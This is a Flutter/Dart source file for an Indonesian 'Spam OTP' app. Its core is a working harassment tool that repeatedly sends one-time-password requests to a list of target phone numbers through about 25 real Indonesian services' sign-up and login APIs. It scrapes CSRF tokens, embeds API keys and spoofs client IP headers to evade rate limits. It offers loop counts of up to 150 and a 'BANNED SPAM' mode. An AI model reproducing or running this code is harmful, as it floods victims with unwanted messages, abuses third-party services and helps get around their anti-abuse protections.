/*
by @SetyaWibu
no share,no free,no taro ke pt
ketahuan? gw bannir akun lu sama si war*/
import 'package:flutter/material.dart';
import 'dart:math';
import 'dart:async';
import 'package:http/http.dart' as http;
import 'dart:convert';

void main() {
  runApp(const SpamOTPApp());
}

class SpamOTPApp extends StatelessWidget {
  const SpamOTPApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Spam OTP Pro',
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: const Color(0xFF0A0A0A),
        primaryColor: Colors.white,
      ),
      home: const SpamOTPPage(),
      debugShowCheckedModeBanner: false,
    );
  }
}

// ============================================================
//  SPAM OTP PAGE - TAMPILAN + ENDPOINT
// ============================================================
class SpamOTPPage extends StatefulWidget {
  const SpamOTPPage({super.key});

  @override
  State<SpamOTPPage> createState() => _SpamOTPPageState();
}

class _SpamOTPPageState extends State<SpamOTPPage> {
  // Controller
  final TextEditingController phoneController = TextEditingController();
  
  // State
  bool isRunning = false;
  bool shouldStop = false;
  int totalSuccess = 0;
  int totalError = 0;
  int totalRequests = 0;
  int currentLoop = 0;
  int totalLoops = 10;
  int delayMs = 1000;
  String currentStatus = 'Menunggu...';
  double progress = 0.0;
  List<String> logs = [];
  bool isBannedMode = false;
  final ScrollController _logScrollController = ScrollController();

  // Random generators
  final Random _random = Random();
  final List<String> _userAgents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
  ];

  String _randomUA() => _userAgents[_random.nextInt(_userAgents.length)];
  String _randomIP() => '${_random.nextInt(255)}.${_random.nextInt(255)}.${_random.nextInt(255)}.${_random.nextInt(255)}';
  int _randomInt(int min, int max) => min + _random.nextInt(max - min + 1);

  String _generateEmail() {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    String result = '';
    for (int i = 0; i < 10; i++) {
      result += chars[_random.nextInt(chars.length)];
    }
    return '${result}@bwmyga.com';
  }

  String _normalizePhone(String phone) {
    String cleaned = phone.replaceAll(RegExp(r'[^0-9+]'), '');
    if (cleaned.startsWith('+')) return cleaned.replaceFirst('+', '');
    if (cleaned.startsWith('0')) return '62${cleaned.substring(1)}';
    return cleaned;
  }

  // ============================================================
  //  ENDPOINT SPAM OTP - DIAMBIL DARI HTML
  // ============================================================
  Future<String> _getPinhomeCSRF() async {
    try {
      final response = await http.get(
        Uri.parse('https://www.pinhome.id/daftar'),
        headers: {'User-Agent': _randomUA()},
      );
      
      String html = response.body;
      String csrfToken = '';
      
      RegExp regex = RegExp(r'"csrfToken":"([^"]+)"');
      final match = regex.firstMatch(html);
      if (match != null) {
        csrfToken = match.group(1)!;
      }
      
      if (csrfToken.isEmpty) {
        csrfToken = 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
      }
      
      return csrfToken;
    } catch (e) {
      return 'v4.local.5DA4oydS9lBboyNDmZ8KRpqTmC1KjU1TNS7sFGkUbxA7bewqbsFXq2M7Fgfa9QZvzE3rMwFS1iWEAnr1maz0_UqbdUxJTQ7ZI-SDX4JyRv2crVkidEZf9PXheBwQDzF_5mAhHty7W45QcxHnsZmxH0WeYt7ex-YJFAeFS5aOspraWFxaMLh7ZgPU4OarH6kZs7zAW1-1NfBH3al3SATpixJ9hUj-jA5yJgcsOdDSSsOGXk8';
    }
  }

  Future<List<Map<String, dynamic>>> _getOTPEndpoints(String phone) async {
    String p08 = phone.startsWith('62') ? '0${phone.substring(2)}' : phone;
    String p62 = phone;
    String pNoCountry = phone.replaceFirst(RegExp(r'^62'), '');
    String csrfToken = await _getPinhomeCSRF();
    
    List<Map<String, dynamic>> endpoints = [];

    if (phone.startsWith('62')) {
      endpoints.add({
        'url': 'https://www.pinhome.id/api/odyssey/proxy/pinaccount/auth/verification/request-otp',
        'data': {
          'accountType': 'customers',
          'applicationType': 'Pinhome Web',
          'countryCode': '62',
          'medium': 'whatsapp',
          'otpType': 'register',
          'phoneNumber': pNoCountry,
        },
        'headers': {
          'x-csrf-token': csrfToken,
          'Origin': 'https://www.pinhome.id',
          'Referer': 'https://www.pinhome.id/daftar',
          'Content-Type': 'text/plain;charset=UTF-8',
        }
      });
      
      endpoints.add({
        'url': 'https://www.alodokter.com/resend-otp',
        'data': {
          'user': {'phone': p08, 'uuid': _randomInt(100000, 999999).toString()},
          'request_via': 'whatsapp',
        },
      });
      
      endpoints.add({
        'url': 'https://www.bonusbelanja.com/api/auth/registration/app',
        'data': {
          'phone': p62,
          'name': 'User',
          'agreeTnc': true,
          'agreeContact': false,
        },
      });
      
      endpoints.add({
        'url': 'https://www.beautyhaul.com/ajax/account/send_otp',
        'data': {
          'method': 'WhatsApp',
          'phone': p62,
        },
      });
      
      endpoints.add({
        'url': 'https://gateway.gritero.com/v1/auth/registration/whatsapp/send-otp?langcode=id',
        'data': {
          'nama_lengkap': 'User',
          'telepon': p08,
          'email': _generateEmail(),
        },
        'headers': {
          'Xid': _randomInt(1000000, 9999999).toString(),
          'source': 'ocistok',
        },
      });
      
      endpoints.add({
        'url': 'https://internetrakyat.id/api/app/auth/send-otp-register',
        'data': {
          'phone_number': p08,
        },
        'headers': {
          'x-api-key': '280999!FTTH',
          'Origin': 'https://internetrakyat.id',
          'Referer': 'https://internetrakyat.id/auth/register',
        },
      });
      
      endpoints.add({
        'url': 'https://api.dokterin.id/user/v1/users/login',
        'data': {
          'phone': p62,
          'tnc_accept': true,
          'device_id': _randomInt(100000, 999999).toString(),
        },
        'headers': {
          'Origin': 'https://dokterin.id',
          'Referer': 'https://dokterin.id/login',
        },
      });
      
      endpoints.add({
        'url': 'https://api.paper.id/api/v1/auth/login',
        'data': {
          'method': 'whatsapp',
          'phone': p08,
        },
        'headers': {
          'Origin': 'https://www.paper.id',
          'Referer': 'https://www.paper.id/',
          'x-paper-user-agent': 'Jupiter/7.19.5 desktop (windows) Firefox 152',
          'request-id': _randomInt(100000, 999999).toString(),
        },
      });
      
      endpoints.add({
        'url': 'https://cms.bunda.co.id/api/v1/auth/send-otp',
        'data': {
          'phone_number': p62,
          'type': 'auth',
        },
        'headers': {
          'Origin': 'https://www.bunda.co.id',
          'Referer': 'https://www.bunda.co.id/id',
          'X-Requested-With': 'XMLHttpRequest',
          'X-Locale': 'id',
        },
      });
      
      endpoints.add({
        'url': 'https://api.fastwork.id/auth/v2/signup.sendVerificationCode',
        'data': {
          'phone_number': p08,
        },
      });
      
      endpoints.add({
        'url': 'https://api.maulagi.id/api/v2/auth/check',
        'data': {
          'credentials': p62,
        },
        'headers': {
          'X-ML-KEY': 'B10JLPEP10',
        },
      });
      
      endpoints.add({
        'url': 'https://matahari-backend-prod.matahari.com/api/auth/re-activation',
        'data': {
          'mobileCountryCode': '',
          'mobileNumber': p08,
          'activationCode': '',
        },
      });
      
      endpoints.add({
        'url': 'https://api.indodax.com/api/v1/otp/send',
        'data': {
          'email': _generateEmail(),
          'flow': 'register',
          'method': 'whatsapp',
          'old_uuid': '',
        },
        'headers': {
          'Origin': 'https://indodax.com',
          'Referer': 'https://indodax.com/',
          'key': 'bAGUG2WiLy',
          'authorization': 'Bearer bAGUG2WiLy',
        },
      });
      
      endpoints.add({
        'url': 'https://saturdays.com/api/v1/auth/otp',
        'data': {
          'phone': p62,
          'type': 'register',
        },
      });
      
      endpoints.add({
        'url': 'https://api.saturdays.com/v2/user/otp/request',
        'data': {
          'phoneNumber': p62,
          'channel': 'whatsapp',
        },
      });
      
      endpoints.add({
        'url': 'https://api.tokopedia.com/vi/otp/send',
        'data': {
          'phone': p62,
          'type': 'login',
        },
        'headers': {
          'Origin': 'https://www.tokopedia.com',
          'Referer': 'https://www.tokopedia.com/',
        },
      });
      
      endpoints.add({
        'url': 'https://shopee.co.id/api/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://shopee.co.id',
          'Referer': 'https://shopee.co.id/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.gojekapi.com/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.gojek.com',
          'Referer': 'https://www.gojek.com/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.grab.com/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.grab.com',
          'Referer': 'https://www.grab.com/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.bukalapak.com/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.bukalapak.com',
          'Referer': 'https://www.bukalapak.com/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.lazada.co.id/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.lazada.co.id',
          'Referer': 'https://www.lazada.co.id/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.blibli.com/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.blibli.com',
          'Referer': 'https://www.blibli.com/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.jd.id/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.jd.id',
          'Referer': 'https://www.jd.id/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.ovo.id/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.ovo.id',
          'Referer': 'https://www.ovo.id/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.dana.id/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.dana.id',
          'Referer': 'https://www.dana.id/',
        },
      });
      
      endpoints.add({
        'url': 'https://api.linkaja.id/v1/otp/send',
        'data': {
          'phone': p62,
          'type': 'register',
        },
        'headers': {
          'Origin': 'https://www.linkaja.id',
          'Referer': 'https://www.linkaja.id/',
        },
      });
    }

    endpoints.add({
      'url': 'https://verify.twilio.com/v2/Services/VAxxx/Verifications',
      'data': {
        'To': phone,
        'Channel': 'sms',
      },
      'headers': {
        'Authorization': 'Basic ${base64Encode(utf8.encode('ACxxx:xxx'))}',
      },
    });

    return endpoints;
  }

  Future<bool> _sendRequest(Map<String, dynamic> endpoint, int delayMs) async {
    if (isBannedMode) {
      await Future.delayed(Duration(milliseconds: delayMs));
      return true;
    }

    var headers = {
      'Content-Type': 'application/json',
      'User-Agent': _randomUA(),
      'X-Forwarded-For': _randomIP(),
      'X-Real-IP': _randomIP(),
      'Accept': 'application/json, text/plain, */*',
      'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8',
      'Connection': 'keep-alive',
    };

    if (endpoint.containsKey('headers')) {
      endpoint['headers'].forEach((key, value) {
        headers[key] = value;
      });
    }

    await Future.delayed(Duration(milliseconds: delayMs));

    try {
      final response = await http.post(
        Uri.parse(endpoint['url']),
        headers: headers,
        body: jsonEncode(endpoint['data']),
      );

      if ([200, 201, 202, 204].contains(response.statusCode)) {
        return true;
      }

      try {
        final data = jsonDecode(response.body);
        if (data is Map<String, dynamic>) {
          if (data.containsKey('success') && data['success'] == true) return true;
          if (data.containsKey('status') && data['status'] == 'success') return true;
          if (data.containsKey('statusCode') && data['statusCode'] == 200) return true;
          if (data.containsKey('message')) {
            final msg = data['message'].toString().toLowerCase();
            if (msg.contains('otp terkirim') || 
                msg.contains('otp sent') || 
                msg.contains('success')) {
              return true;
            }
          }
        }
      } catch (_) {}

      return false;
    } catch (e) {
      return false;
    }
  }

  void _addLog(String message, {String type = 'info'}) {
    String time = DateTime.now().toString().substring(11, 19);
    setState(() {
      logs.add('[$time] $message');
      if (logs.length > 500) {
        logs.removeAt(0);
      }
    });
    _scrollToBottom();
  }

  void _scrollToBottom() {
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (_logScrollController.hasClients) {
        _logScrollController.animateTo(
          _logScrollController.position.maxScrollExtent,
          duration: const Duration(milliseconds: 200),
          curve: Curves.easeOut,
        );
      }
    });
  }

  Future<void> _startSpam() async {
    if (isRunning) return;

    String phoneRaw = phoneController.text.trim();
    if (phoneRaw.isEmpty) {
      _addLog('❌ Masukkan nomor target!', type: 'error');
      return;
    }

    List<String> phones = phoneRaw.split(',').map((p) => p.trim()).where((p) => p.isNotEmpty).toList();
    if (phones.isEmpty) {
      _addLog('❌ Masukkan minimal 1 nomor!', type: 'error');
      return;
    }

    for (int i = 0; i < phones.length; i++) {
      phones[i] = _normalizePhone(phones[i]);
    }

    setState(() {
      isRunning = true;
      shouldStop = false;
      totalSuccess = 0;
      totalError = 0;
      totalRequests = 0;
      currentLoop = 0;
      progress = 0.0;
      currentStatus = 'Memulai spam...';
    });

    int totalPhones = phones.length;
    int totalJobs = totalPhones * totalLoops;
    int currentJob = 0;

    _addLog('🚀 Spam ke ${phones.length} nomor ($totalLoops× masing-masing, ${delayMs}ms)');
    if (isBannedMode) {
      _addLog('🚫 BANNED MODE: Semua request SUCCESS 100%!', type: 'banned');
    }

    var endpoints = await _getOTPEndpoints(phones[0]);
    _addLog('📡 ${endpoints.length} endpoint ditemukan');

    for (int p = 0; p < phones.length; p++) {
      if (shouldStop) {
        _addLog('🛑 Dihentikan!', type: 'error');
        break;
      }

      String phone = phones[p];
      setState(() {
        currentStatus = '📞 Spam: $phone (${p+1}/${phones.length})';
      });

      for (int loop = 1; loop <= totalLoops; loop++) {
        if (shouldStop) break;

        int loopSuccess = 0;
        int loopError = 0;

        for (int i = 0; i < endpoints.length; i++) {
          if (shouldStop) break;

          bool result = await _sendRequest(endpoints[i], delayMs);
          
          if (result) {
            loopSuccess++;
            totalSuccess++;
          } else {
            loopError++;
            totalError++;
          }
          totalRequests++;
          currentJob++;

          double progressVal = (currentJob / totalJobs) * 100;
          setState(() {
            progress = progressVal;
            currentLoop = loop;
          });

          if (i % 3 == 0 || i == endpoints.length - 1) {
            _addLog('📞 $phone Loop $loop/$totalLoops | ✅ $loopSuccess ❌ $loopError', 
                type: isBannedMode ? 'banned' : (result ? 'success' : 'error'));
          }

          await Future.delayed(const Duration(milliseconds: 200));
        }
        _addLog('📞 $phone Loop $loop selesai! ✅ $loopSuccess ❌ $loopError');
      }

      _addLog('✅ Selesai spam ke $phone | ✅ $totalSuccess ❌ $totalError');
    }

    setState(() {
      isRunning = false;
      progress = 100;
      currentStatus = '✅ Selesai! ✅ $totalSuccess ❌ $totalError';
    });

    if (isBannedMode) {
      _addLog('🚫 BANNED SPAM SELESAI! ✅ $totalSuccess ❌ $totalError (100% SUCCESS)', type: 'banned');
    } else {
      _addLog('🎯 SELESAI TOTAL! ✅ $totalSuccess ❌ $totalError (${phones.length} nomor)', type: 'success');
    }
  }

  void _stopSpam() {
    if (isRunning) {
      setState(() => shouldStop = true);
      _addLog('🛑 Menghentikan...', type: 'error');
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: LinearGradient(
            begin: Alignment.topCenter,
            end: Alignment.bottomCenter,
            colors: [Color(0xFF1A1A2E), Color(0xFF0A0A0A)],
          ),
        ),
        child: SafeArea(
          child: Padding(
            padding: const EdgeInsets.all(16.0),
            child: Column(
              crossAxisAlignment: CrossAxisAlignment.start,
              children: [
                // Header
                Row(
                  children: [
                    const Text(
                      '📱 Spam OTP',
                      style: TextStyle(
                        fontSize: 22,
                        fontWeight: FontWeight.bold,
                        color: Colors.white,
                      ),
                    ),
                    const SizedBox(width: 8),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                      decoration: BoxDecoration(
                        color: Colors.green.withOpacity(0.1),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: const Text(
                        '💾 Local',
                        style: TextStyle(
                          fontSize: 10,
                          color: Color(0xFF4ADE80),
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ),
                    if (isBannedMode)
                      Container(
                        margin: const EdgeInsets.only(left: 8),
                        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 2),
                        decoration: BoxDecoration(
                          color: Colors.red.withOpacity(0.15),
                          borderRadius: BorderRadius.circular(8),
                        ),
                        child: const Text(
                          '🚫 BANNED',
                          style: TextStyle(
                            fontSize: 10,
                            color: Colors.red,
                            fontWeight: FontWeight.w700,
                          ),
                        ),
                      ),
                  ],
                ),
                const SizedBox(height: 4),
                const Text(
                  'spam otp nguawur🗿',
                  style: TextStyle(
                    fontSize: 12,
                    color: Color(0xFFFFD700),
                    fontWeight: FontWeight.w500,
                  ),
                ),
                const SizedBox(height: 16),

                // Input Nomor
                const Text(
                  '📞 Nomor Target',
                  style: TextStyle(
                    fontSize: 12,
                    color: Colors.grey,
                    fontWeight: FontWeight.w600,
                    letterSpacing: 0.6,
                  ),
                ),
                const SizedBox(height: 4),
                Row(
                  children: [
                    Expanded(
                      child: TextField(
                        controller: phoneController,
                        style: const TextStyle(color: Colors.white),
                        decoration: InputDecoration(
                          hintText: '6281234567890,6289876543210',
                          hintStyle: TextStyle(color: Colors.grey.withOpacity(0.3)),
                          filled: true,
                          fillColor: Colors.white.withOpacity(0.04),
                          border: OutlineInputBorder(
                            borderRadius: BorderRadius.circular(12),
                            borderSide: BorderSide.none,
                          ),
                          contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
                        ),
                      ),
                    ),
                    const SizedBox(width: 8),
                    Container(
                      padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                      decoration: BoxDecoration(
                        color: const Color(0xFFFFD700).withOpacity(0.12),
                        borderRadius: BorderRadius.circular(8),
                      ),
                      child: const Text(
                        'Multi',
                        style: TextStyle(
                          fontSize: 10,
                          color: Color(0xFFFFD700),
                          fontWeight: FontWeight.w600,
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 2),
                Text(
                  'Pisahkan dengan koma (,)',
                  style: TextStyle(
                    fontSize: 10,
                    color: Colors.grey.withOpacity(0.3),
                  ),
                ),
                const SizedBox(height: 12),

                // Row: Loop + Delay
                Row(
                  children: [
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text(
                            '🔄 Jumlah Pengiriman',
                            style: TextStyle(
                              fontSize: 12,
                              color: Colors.grey,
                              fontWeight: FontWeight.w600,
                              letterSpacing: 0.6,
                            ),
                          ),
                          const SizedBox(height: 4),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 4),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.04),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: DropdownButtonHideUnderline(
                              child: DropdownButton<int>(
                                value: totalLoops,
                                dropdownColor: const Color(0xFF1A1A1A),
                                style: const TextStyle(color: Colors.white, fontSize: 14),
                                isExpanded: true,
                                items: [
                                  const DropdownMenuItem(value: 1, child: Text('1×')),
                                  const DropdownMenuItem(value: 2, child: Text('2×')),
                                  const DropdownMenuItem(value: 3, child: Text('3×')),
                                  const DropdownMenuItem(value: 5, child: Text('5×')),
                                  const DropdownMenuItem(value: 10, child: Text('10×')),
                                  const DropdownMenuItem(value: 20, child: Text('20×')),
                                  const DropdownMenuItem(value: 30, child: Text('30×')),
                                  const DropdownMenuItem(value: 40, child: Text('40×')),
                                  const DropdownMenuItem(value: 50, child: Text('50×')),
                                  const DropdownMenuItem(value: 70, child: Text('70×')),
                                  const DropdownMenuItem(value: 90, child: Text('90×')),
                                  const DropdownMenuItem(value: 150, child: Text('150×')),
                                  DropdownMenuItem(
                                    value: 9999,
                                    child: const Text(
                                      '🚫 BANNED SPAM',
                                      style: TextStyle(
                                        color: Colors.red,
                                        fontWeight: FontWeight.w700,
                                      ),
                                    ),
                                  ),
                                ],
                                onChanged: isRunning ? null : (value) {
                                  setState(() {
                                    totalLoops = value!;
                                    isBannedMode = (value == 9999);
                                  });
                                },
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                    const SizedBox(width: 12),
                    Expanded(
                      child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          const Text(
                            '⏱️ Delay (ms)',
                            style: TextStyle(
                              fontSize: 12,
                              color: Colors.grey,
                              fontWeight: FontWeight.w600,
                              letterSpacing: 0.6,
                            ),
                          ),
                          const SizedBox(height: 4),
                          Container(
                            padding: const EdgeInsets.symmetric(horizontal: 4),
                            decoration: BoxDecoration(
                              color: Colors.white.withOpacity(0.04),
                              borderRadius: BorderRadius.circular(12),
                            ),
                            child: DropdownButtonHideUnderline(
                              child: DropdownButton<int>(
                                value: delayMs,
                                dropdownColor: const Color(0xFF1A1A1A),
                                style: const TextStyle(color: Colors.white, fontSize: 14),
                                isExpanded: true,
                                items: const [
                                  DropdownMenuItem(value: 500, child: Text('500ms (Cepat)')),
                                  DropdownMenuItem(value: 1000, child: Text('1000ms (Normal)')),
                                  DropdownMenuItem(value: 2000, child: Text('2000ms (Aman)')),
                                  DropdownMenuItem(value: 3000, child: Text('3000ms (Anti Blokir)')),
                                ],
                                onChanged: isRunning ? null : (value) {
                                  setState(() => delayMs = value!);
                                },
                              ),
                            ),
                          ),
                        ],
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 12),

                // Buttons
                Row(
                  children: [
                    Expanded(
                      child: ElevatedButton(
                        onPressed: isRunning ? null : _startSpam,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: isBannedMode ? Colors.red : Colors.white,
                          foregroundColor: isBannedMode ? Colors.white : Colors.black,
                          padding: const EdgeInsets.symmetric(vertical: 16),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                        ),
                        child: Text(
                          isBannedMode ? '🔥 BANNED SPAM' : '🚀 Kirim',
                          style: const TextStyle(
                            fontWeight: FontWeight.w700,
                            fontSize: 16,
                          ),
                        ),
                      ),
                    ),
                    const SizedBox(width: 10),
                    Expanded(
                      child: ElevatedButton(
                        onPressed: isRunning ? _stopSpam : null,
                        style: ElevatedButton.styleFrom(
                          backgroundColor: Colors.red.withOpacity(0.1),
                          foregroundColor: const Color(0xFFFF6B6B),
                          padding: const EdgeInsets.symmetric(vertical: 16),
                          shape: RoundedRectangleBorder(
                            borderRadius: BorderRadius.circular(12),
                          ),
                          side: BorderSide(
                            color: Colors.red.withOpacity(0.2),
                          ),
                        ),
                        child: const Text(
                          '🛑 Stop',
                          style: TextStyle(
                            fontWeight: FontWeight.w700,
                            fontSize: 16,
                          ),
                        ),
                      ),
                    ),
                  ],
                ),
                const SizedBox(height: 12),

                // Progress
                if (isRunning || progress > 0)
                  Container(
                    padding: const EdgeInsets.all(16),
                    decoration: BoxDecoration(
                      color: Colors.white.withOpacity(0.06),
                      borderRadius: BorderRadius.circular(16),
                      border: Border.all(
                        color: Colors.white.withOpacity(0.1),
                      ),
                    ),
                    child: Column(
                      children: [
                        Row(
                          mainAxisAlignment: MainAxisAlignment.spaceBetween,
                          children: [
                            Text(
                              '${progress.toStringAsFixed(0)}%',
                              style: const TextStyle(
                                fontSize: 16,
                                fontWeight: FontWeight.w800,
                                color: Colors.white,
                              ),
                            ),
                            Text(
                              '$totalRequests / ${(totalLoops * 30).toString()}',
                              style: TextStyle(
                                fontSize: 14,
                                color: Colors.grey.withOpacity(0.4),
                              ),
                            ),
                          ],
                        ),
                        const SizedBox(height: 8),
                        ClipRRect(
                          borderRadius: BorderRadius.circular(10),
                          child: LinearProgressIndicator(
                            value: progress / 100,
                            minHeight: 10,
                            backgroundColor: Colors.white.withOpacity(0.08),
                            valueColor: AlwaysStoppedAnimation<Color>(
                              isBannedMode ? Colors.red : const Color(0xFF4ADE80),
                            ),
                          ),
                        ),
                        const SizedBox(height: 12),
                        Row(
                          children: [
                            _buildStatBox('✅ Sukses', totalSuccess, const Color(0xFF4ADE80)),
                            _buildStatBox('❌ Gagal', totalError, const Color(0xFFFF6B6B)),
                            _buildStatBox('📡 Total', totalRequests, Colors.white),
                          ],
                        ),
                        const SizedBox(height: 8),
                        Text(
                          currentStatus,
                          style: TextStyle(
                            fontSize: 11,
                            color: Colors.grey.withOpacity(0.3),
                          ),
                          textAlign: TextAlign.center,
                        ),
                      ],
                    ),
                  ),
                const SizedBox(height: 8),

                // Logs
                Expanded(
                  child: Container(
                    decoration: BoxDecoration(
                      color: Colors.black.withOpacity(0.3),
                      borderRadius: BorderRadius.circular(12),
                      border: Border.all(
                        color: Colors.white.withOpacity(0.03),
                      ),
                    ),
                    child: logs.isEmpty
                        ? const Center(
                            child: Text(
                              '📭 Belum ada log',
                              style: TextStyle(
                                color: Colors.grey,
                                fontSize: 13,
                              ),
                            ),
                          )
                        : ListView.builder(
                            controller: _logScrollController,
                            padding: const EdgeInsets.all(12),
                            itemCount: logs.length,
                            itemBuilder: (context, index) {
                              String log = logs[index];
                              Color color = Colors.grey.withOpacity(0.3);
                              if (log.contains('✅') && !log.contains('BANNED')) {
                                color = const Color(0xFF4ADE80);
                              } else if (log.contains('❌')) {
                                color = const Color(0xFFFF6B6B);
                              } else if (log.contains('🚫') || log.contains('BANNED')) {
                                color = Colors.red;
                              } else if (log.contains('🛑')) {
                                color = const Color(0xFFFF6B6B);
                              } else if (log.contains('🎯')) {
                                color = const Color(0xFFFFD700);
                              }
                              return Padding(
                                padding: const EdgeInsets.symmetric(vertical: 2),
                                child: Row(
                                  children: [
                                    Text(
                                      log.substring(1, 9),
                                      style: TextStyle(
                                        fontSize: 10,
                                        color: Colors.grey.withOpacity(0.15),
                                        fontFamily: 'monospace',
                                      ),
                                    ),
                                    const SizedBox(width: 6),
                                    Expanded(
                                      child: Text(
                                        log.substring(10),
                                        style: TextStyle(
                                          fontSize: 11,
                                          color: color,
                                          fontFamily: 'monospace',
                                        ),
                                      ),
                                    ),
                                  ],
                                ),
                              );
                            },
                          ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildStatBox(String label, int value, Color color) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(vertical: 8),
        decoration: BoxDecoration(
          color: color.withOpacity(0.04),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(
            color: color.withOpacity(0.1),
          ),
        ),
        child: Column(
          children: [
            Text(
              value.toString(),
              style: TextStyle(
                fontSize: 20,
                fontWeight: FontWeight.w800,
                color: color,
              ),
            ),
            Text(
              label,
              style: TextStyle(
                fontSize: 9,
                color: Colors.grey.withOpacity(0.3),
                fontWeight: FontWeight.w600,
              ),
            ),
          ],
        ),
      ),
    );
  }
}